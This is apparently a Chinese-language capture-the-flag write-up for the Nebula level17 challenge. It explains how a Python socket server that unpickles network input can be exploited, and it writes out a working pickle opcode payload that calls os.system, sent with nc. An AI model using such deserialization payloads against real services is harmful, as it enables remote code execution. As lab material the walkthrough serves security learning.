这是关要求分析一个有漏洞的Python脚本。在这关里，我们将看到Python的pickle库涉及的一个严重安全问题。首先看看这关给出的代码：

#+BEGIN_SRC python
  #!/usr/bin/python

  import os
  import pickle
  import time
  import socket
  import signal

  signal.signal(signal.SIGCHLD, signal.SIG_IGN)

  def server(skt):
      line = skt.recv(1024)

      obj = pickle.loads(line)

      for i in obj:
          clnt.send("why did you send me " + i + "?\n")


  skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
  skt.bind(('0.0.0.0', 10007))
  skt.listen(10)

  while True:
      clnt, addr = skt.accept()

      if(os.fork() == 0):
          clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
          server(clnt)
          exit(1)
#+END_SRC

脚本首先建立socket的监听，监听端口10007，然后接受来自客户端的连接，并将客户端发送的数据使用pickle.loads处理。

要想通关，必须首先了解一下pickle，pickle‎在python中可以用来持久存储对象。就是把对象按照一定的格式保存在文件中，在另外的脚本中使用pickle.load或者pickle.loads即可重新使用这些对象，load和loads函数不同之处是load处理存储在文件里的pickle格式数据，loads则是处理字符串表达的pickle格式的数据。

做一个例子，a.py脚本如下：

#+BEGIN_SRC python
  by = 'lu4nx'
  import pickle
  f = open('/tmp/lx','w')
  pickle.dump(by,f)
#+END_SRC

执行之后，/tmp目录下多出个lx，内容如下：

#+BEGIN_EXAMPLE
  lu4nx:tmp$cat lx
  S'lu4nx'
  p0
#+END_EXAMPLE

再看b.py的内容：

#+BEGIN_SRC python
  f = open('/tmp/lx')
  import pickle
  a = pickle.load(f)
  print a
#+END_SRC

执行之后，输出lu4nx。现在来分析一下/tmp/lx：

#+BEGIN_EXAMPLE
  S'lu4nx'
  p0
#+END_EXAMPLE

我看了pickle这个标准库的源码，似乎它是用栈的概念来解析操作码的，比如：

S'字符串'，源码中的解释是：Push a Python string object。这里我们理解成生成一个字符串即可。
同样，p操作符的解释是：Store the stack top into the memo.  The stack is not popped（压入栈顶？）

大家若是有兴趣的，可以看看pickletools.py的源码，我对它只是理解迷迷糊糊的，但是不影响我通过这关。反正，利用pickle的操作码，我们足以构造一个“shellcode”。我这里给出最主要的操作码：

想要使用模块，则用操作码c，比如这关要使用到os模块，则：cos;如果要使用python内置函数，则是：c__builtin__。
想要使用一个字符串，则S'字符串'
想要把参数带入“栈”中调用函数，则(S'参数'，官方叫它MARK对象
t操作码则是从栈顶开始弹出所有值，包括MARK对象。
R则pop栈顶两项内容（不太明白）
最后，”."代表pickle结束标志。

我个人理解pickle调用函数的方式是：导入模块 -> 调用函数 -> 存储参数 -> pop值和MARK对象（执行），对应的代码如下：

#+BEGIN_EXAMPLE
  cos
  system
  (S'ps'
  tR.
#+END_EXAMPLE

如果我把上方代码保存到/tmp/lx中，那么b.py就会执行：

#+BEGIN_SRC python
  import os
  os.system('ps')
#+END_SRC

继续返回到关卡的代码中，我们可以看到代码的流程是：

首先建立监听 -> 客户端发送请求 -> 接受请求 -> 调用server函数 -> server函数中把收到的数据存储到line变量中 -> 之后pickle.loads。

前面说到过，loads接受来自字符串的pickle格式，如：

#+BEGIN_SRC python
  pickle.loads("""cos\nsystem\n(S'ps'\ntR.""")
#+END_SRC

上方代码，会执行system('ps')函数。

先在/tmp目录中建立一个lx：

#+BEGIN_EXAMPLE
  cos
  system
  (S'getflag>/tmp/level17'
  tR.
#+END_EXAMPLE

执行下面一系列命令，将提升权限：

#+BEGIN_EXAMPLE
  level17@nebula:~$
  level17@nebula:~$ cd /home/flag17
  level17@nebula:/home/flag17$ cd /tmp
  level17@nebula:/tmp$ ls
  lx
  level17@nebula:/tmp$ cat x | nc 127.0.0.1 10007
  Accepted connection from 127.0.0.1:46865<=====这里一定要回车一下

  ^C<=====Ctrl+C中断
  level17@nebula:/tmp$ cat level17
  You have successfully executed getflag on a target account
  level17@nebula:/tmp$
#+END_EXAMPLE
